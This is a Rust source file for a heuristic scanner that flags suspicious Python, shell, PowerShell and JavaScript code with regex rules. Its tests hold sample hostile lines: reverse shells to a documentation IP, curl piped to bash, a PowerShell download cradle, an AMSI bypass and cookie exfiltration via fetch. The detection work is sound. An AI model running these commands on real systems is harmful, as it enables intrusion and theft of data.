//! Heuristic flags for suspicious behavior in Python code. These are pattern
//! matches, not proof: the UI labels them as heuristics. Each rule fires at
//! most once per layer and reports the first matching line.

use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum Level {
    Info,
    Warn,
    Fail,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct Flag {
    pub level: Level,
    pub rule: &'static str,
    pub title: &'static str,
    pub detail: String,
    pub layer: usize,
    /// 1-based line in that layer, when known.
    pub line: Option<usize>,
    /// The matching line, trimmed and shortened.
    pub snippet: String,
}

struct Rule {
    id: &'static str,
    level: Level,
    title: &'static str,
    detail: &'static str,
    /// Every pattern must match somewhere in the layer; the first one locates
    /// the line.
    all: Vec<Regex>,
}

fn rule(
    id: &'static str,
    level: Level,
    title: &'static str,
    detail: &'static str,
    all: &[&str],
) -> Rule {
    Rule {
        id,
        level,
        title,
        detail,
        all: all
            .iter()
            .map(|p| Regex::new(p).expect("valid rule regex"))
            .collect(),
    }
}

static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    vec![
        rule(
            "download-exec",
            Level::Fail,
            "Downloads and runs code",
            "Fetches content over the network and passes code to exec, eval, a shell, or marks a file executable.",
            &[
                r"\b(?:urlopen|urlretrieve|requests\.(?:get|post)|http\.client|urllib\.request|wget|curl)\b",
                r"\b(?:exec|eval)\s*\(|\bos\.system\b|\bsubprocess\b|\bchmod\b|\bos\.chmod\b",
            ],
        ),
        rule(
            "reverse-shell",
            Level::Fail,
            "Reverse shell pattern",
            "Opens a socket, connects out, and wires it to a shell or the process's stdin/stdout.",
            &[
                r"\bsocket\.socket\b|\bsocket\(\s*socket\.AF_INET",
                r"\.connect\s*\(",
                r"\bos\.dup2\b|\bpty\.spawn\b|/bin/(?:ba|z)?sh\b",
            ],
        ),
        rule(
            "shellcode",
            Level::Fail,
            "Shellcode loader pattern",
            "Uses ctypes to allocate executable memory or start a thread, typical of in-memory payload loaders.",
            &[
                r"\bctypes\b",
                r"\bVirtualAlloc\b|\bVirtualProtect\b|\bCreateThread\b|\bRtlMoveMemory\b|PROT_EXEC|\bmprotect\b",
            ],
        ),
        rule(
            "persistence",
            Level::Fail,
            "Persistence mechanism",
            "Touches autostart locations: cron, shell profiles, systemd units, LaunchAgents, Run keys or scheduled tasks.",
            &[
                r"crontab|/etc/cron|\.bashrc|\.bash_profile|\.zshrc|\.profile\b|systemd/system|\.service\b|LaunchAgents|LaunchDaemons|\\CurrentVersion\\Run|\bwinreg\b|schtasks|\\Startup\\",
            ],
        ),
        rule(
            "cred-access",
            Level::Warn,
            "Reads credentials or secrets",
            "References SSH keys, password files, browser credential stores, keychains or cloud credentials.",
            &[
                r"\.ssh/id_|/etc/shadow|/etc/passwd|Login Data|\bCookies\b|keychain|\.aws/credentials|AWS_SECRET|\.kube/config|wallet\.dat",
            ],
        ),
        rule(
            "shell",
            Level::Warn,
            "Runs shell commands",
            "Starts processes through os.system, os.popen, subprocess or pty.",
            &[
                r"\bos\.(?:system|popen|exec[lv]p?e?)\b|\bsubprocess\.(?:Popen|call|run|check_output|check_call|getoutput)\b|\bpty\.spawn\b|\bcommands\.getoutput\b",
            ],
        ),
        rule(
            "bytecode",
            Level::Warn,
            "Loads serialized code",
            "marshal, pickle or types.CodeType can load and run code that never appears as source.",
            &[r"\bmarshal\.loads\b|\bpickle\.loads?\b|\btypes\.CodeType\b|\bdill\.loads\b"],
        ),
        rule(
            "self-delete",
            Level::Warn,
            "Deletes itself or cleans up traces",
            "Removes its own file or wipes directories, often to hinder analysis.",
            &[r"\bos\.(?:remove|unlink)\s*\(\s*(?:__file__|sys\.argv\[0\])|\bshutil\.rmtree\b"],
        ),
        rule(
            "anti-analysis",
            Level::Info,
            "Anti-analysis checks",
            "Long sleeps, VM or sandbox names, or debugger checks.",
            &[
                r"\bsleep\s*\(\s*\d{3,}|\bVirtualBox\b|\bvmware\b|\bVBOX\b|\bsandbox\b|\bIsDebuggerPresent\b|\bsys\.gettrace\b",
            ],
        ),
        rule(
            "dynamic-import",
            Level::Info,
            "Dynamic imports or attribute lookups",
            "__import__, importlib, getattr on builtins or globals() hide what is called.",
            &[
                r"\b__import__\s*\(|\bimportlib\b|getattr\s*\(\s*__builtins__|\bglobals\s*\(\s*\)\s*\[",
            ],
        ),
        rule(
            "xor",
            Level::Info,
            "XOR decoding loop",
            "Characters combined with a key by XOR, a common light obfuscation.",
            &[r"\bord\s*\([^)]*\)\s*\^|\^\s*ord\s*\(|\bchr\s*\([^)]*\^"],
        ),
        // --- Shell ---------------------------------------------------------
        rule(
            "sh-download-exec",
            Level::Fail,
            "Pipes a download into a shell",
            "curl or wget output is run directly by a shell or interpreter.",
            &[
                r"\b(?:curl|wget|fetch)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:curl|wget)\b[^\n|]*\|\s*(?:python[23]?|perl|php|ruby|node)\b",
            ],
        ),
        rule(
            "sh-reverse-shell",
            Level::Fail,
            "Shell reverse shell pattern",
            "Redirects a shell to /dev/tcp, or uses nc/ncat/socat to attach a shell to a remote host.",
            &[
                r"/dev/(?:tcp|udp)/[^\s/]+/\d+|\b(?:nc|ncat|netcat)\b[^\n]*\s-(?:e|c)\s|\bsocat\b[^\n]*exec:|\bmkfifo\b[^\n]*\b(?:nc|ncat)\b",
            ],
        ),
        rule(
            "sh-cleanup",
            Level::Warn,
            "Clears history or logs",
            "Wipes shell history or system logs, often to hide activity.",
            &[
                r"\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE=/dev/null|>\s*/var/log/|\brm\s+-[rf]+\s+[^\n]*\.bash_history|\bshred\b",
            ],
        ),
        rule(
            "sh-temp-exec",
            Level::Warn,
            "Runs a file from a temp directory",
            "Makes a file in /tmp, /var/tmp or /dev/shm executable or runs it.",
            &[
                r"\bchmod\s+(?:\+x|[0-7]*7[0-7]*)\s+/(?:tmp|var/tmp|dev/shm)/|(?:^|[\s;&|])/(?:tmp|var/tmp|dev/shm)/[\w.-]+(?:\s|$|;|&)",
            ],
        ),
        // --- PowerShell ----------------------------------------------------
        rule(
            "ps-download-exec",
            Level::Fail,
            "PowerShell download and execute",
            "DownloadString, Invoke-WebRequest or Invoke-RestMethod combined with Invoke-Expression.",
            &[
                r"(?i)DownloadString|DownloadData|Invoke-WebRequest|\biwr\b|Invoke-RestMethod|\birm\b|Net\.WebClient|BitsTransfer",
                r"(?i)\bIEX\b|Invoke-Expression|\[scriptblock\]::Create",
            ],
        ),
        rule(
            "ps-amsi",
            Level::Fail,
            "AMSI bypass",
            "Touches AmsiUtils or amsiInitFailed to switch off antimalware script scanning.",
            &[r"(?i)AmsiUtils|amsiInitFailed|AmsiScanBuffer|amsi\.dll"],
        ),
        rule(
            "ps-defender",
            Level::Fail,
            "Weakens Microsoft Defender",
            "Adds Defender exclusions or disables real-time monitoring.",
            &[
                r"(?i)Add-MpPreference[^\n]*-Exclusion|Set-MpPreference[^\n]*-Disable(?:RealtimeMonitoring|IOAVProtection|BehaviorMonitoring|ScriptScanning)",
            ],
        ),
        rule(
            "ps-stealth",
            Level::Warn,
            "Hidden or policy-bypassing PowerShell",
            "Runs PowerShell hidden, without a profile, or with the execution policy bypassed.",
            &[
                r"(?i)-w(?:indowstyle)?\s+hidden|-ep\s+bypass|-exec(?:utionpolicy)?\s+bypass|-nop(?:rofile)?\b[^\n]*-(?:w|ep|exec)",
            ],
        ),
        rule(
            "ps-reflection",
            Level::Fail,
            "Loads code in memory",
            "Reflection.Assembly::Load or Add-Type with VirtualAlloc, typical of in-memory loaders.",
            &[
                r"(?i)\[(?:System\.)?Reflection\.Assembly\]::Load|Add-Type[^\n]*VirtualAlloc|\bVirtualAlloc\b[^\n]*\bCreateThread\b",
            ],
        ),
        // --- JavaScript ------------------------------------------------------
        rule(
            "js-activex",
            Level::Fail,
            "Windows Script Host objects",
            "ActiveXObject or WScript.Shell can run programs from JScript.",
            &[
                r"(?i)new\s+ActiveXObject|WScript\.Shell|Shell\.Application|Scripting\.FileSystemObject",
            ],
        ),
        rule(
            "js-child-process",
            Level::Warn,
            "Node.js runs system commands",
            "Uses child_process to run programs.",
            &[r"child_process|\bexecSync\s*\(|\bspawnSync\s*\("],
        ),
        rule(
            "js-cookie-exfil",
            Level::Fail,
            "Sends cookies or form data elsewhere",
            "Reads document.cookie or input values and sends them with fetch, XMLHttpRequest, sendBeacon or an image URL.",
            &[
                r"document\.cookie|\.value\b[^\n]*(?:password|card|cvv)",
                r"\bfetch\s*\(|XMLHttpRequest|sendBeacon|new\s+Image\(\)|\.src\s*=",
            ],
        ),
        rule(
            "js-injection",
            Level::Warn,
            "Injects scripts or hidden frames",
            "Writes script tags or hidden iframes into the page.",
            &[
                r#"(?i)document\.write(?:ln)?\s*\([^\n]*<(?:script|iframe)|createElement\(\s*['"](?:script|iframe)['"]\s*\)"#,
            ],
        ),
        rule(
            "js-miner",
            Level::Fail,
            "Cryptocurrency miner",
            "References known browser mining libraries or pools.",
            &[
                r"(?i)coinhive|cryptonight|coin-hive|crypto-loot|minero\.cc|webminepool|stratum\+tcp",
            ],
        ),
        rule(
            "network",
            Level::Info,
            "Network access",
            "Uses sockets or HTTP, FTP, SMTP or Telnet clients.",
            &[
                r"\bsocket\.|\brequests\.|\burllib\b|\bhttp\.client\b|\bftplib\b|\bsmtplib\b|\btelnetlib\b|\bparamiko\b",
            ],
        ),
    ]
});

fn snippet(line: &str) -> String {
    let t = line.trim();
    if t.chars().count() > 160 {
        let s: String = t.chars().take(157).collect();
        format!("{s}...")
    } else {
        t.to_string()
    }
}

/// Run every rule over one layer's text.
pub fn scan(text: &str, layer: usize) -> Vec<Flag> {
    let mut out = Vec::new();
    for r in RULES.iter() {
        if !r.all.iter().all(|re| re.is_match(text)) {
            continue;
        }
        let first = r.all[0].find(text).map(|m| m.start()).unwrap_or(0);
        let line_no = text[..first].matches('\n').count() + 1;
        let line_text = text.lines().nth(line_no - 1).unwrap_or("");
        out.push(Flag {
            level: r.level,
            rule: r.id,
            title: r.title,
            detail: r.detail.to_string(),
            layer,
            line: Some(line_no),
            snippet: snippet(line_text),
        });
    }
    out
}

/// A flag for a layer that the code executes after decoding.
pub fn exec_flag(
    sink: &str,
    layer: usize,
    parent: usize,
    line: usize,
    steps: &str,
    src_line: &str,
) -> Flag {
    Flag {
        level: Level::Fail,
        rule: "exec-decoded",
        title: "Executes decoded code",
        detail: format!(
            "Layer {parent} decodes ({steps}) and passes the result to {sink}; see layer {layer}."
        ),
        layer: parent,
        line: Some(line),
        snippet: snippet(src_line),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(text: &str) -> Vec<&'static str> {
        scan(text, 0).into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn reverse_shell() {
        let src = "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('203.0.113.7',4444))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')";
        let r = rules(src);
        assert!(r.contains(&"reverse-shell"));
        assert!(r.contains(&"shell"));
        assert!(r.contains(&"network"));
        let f = scan(src, 2)
            .into_iter()
            .find(|f| f.rule == "reverse-shell")
            .unwrap();
        assert_eq!(f.line, Some(2));
        assert_eq!(f.layer, 2);
    }

    #[test]
    fn download_and_exec() {
        let r = rules("import urllib.request\nexec(urllib.request.urlopen('http://x').read())");
        assert!(r.contains(&"download-exec"));
    }

    #[test]
    fn clean_code_has_no_flags() {
        assert!(rules("def add(a, b):\n    return a + b\nprint(add(1, 2))").is_empty());
    }

    #[test]
    fn persistence_and_creds() {
        let r =
            rules("open(os.path.expanduser('~/.bashrc'),'a')\nopen('/home/u/.ssh/id_rsa').read()");
        assert!(r.contains(&"persistence") && r.contains(&"cred-access"));
    }

    #[test]
    fn shell_powershell_js_rules() {
        let r = rules(
            "curl -fsSL http://x/i.sh | sudo bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\nhistory -c",
        );
        assert!(
            r.contains(&"sh-download-exec")
                && r.contains(&"sh-reverse-shell")
                && r.contains(&"sh-cleanup")
        );

        let r = rules(
            "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
        );
        assert!(r.contains(&"ps-download-exec") && r.contains(&"ps-stealth"));
        assert!(
            rules("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
                .contains(&"ps-amsi")
        );
        assert!(rules("Add-MpPreference -ExclusionPath C:\\Temp").contains(&"ps-defender"));

        let r = rules("var s = new ActiveXObject('WScript.Shell'); s.Run('calc')");
        assert!(r.contains(&"js-activex"));
        let r = rules("fetch('https://x/c?d=' + document.cookie)");
        assert!(r.contains(&"js-cookie-exfil"));
        assert!(
            rules("document.write('<iframe src=x style=display:none>')").contains(&"js-injection")
        );
    }

    #[test]
    fn plain_shell_and_js_have_no_flags() {
        assert!(rules("#!/bin/sh\nset -e\necho building\nmake -j4\n").is_empty());
        assert!(rules("const sum = (a, b) => a + b;\nconsole.log(sum(1, 2));").is_empty());
    }

    #[test]
    fn long_snippets_are_shortened() {
        let src = format!("os.system('{}')", "a".repeat(500));
        let f = &scan(&src, 0)[0];
        assert!(f.snippet.ends_with("...") && f.snippet.chars().count() == 160);
    }
}
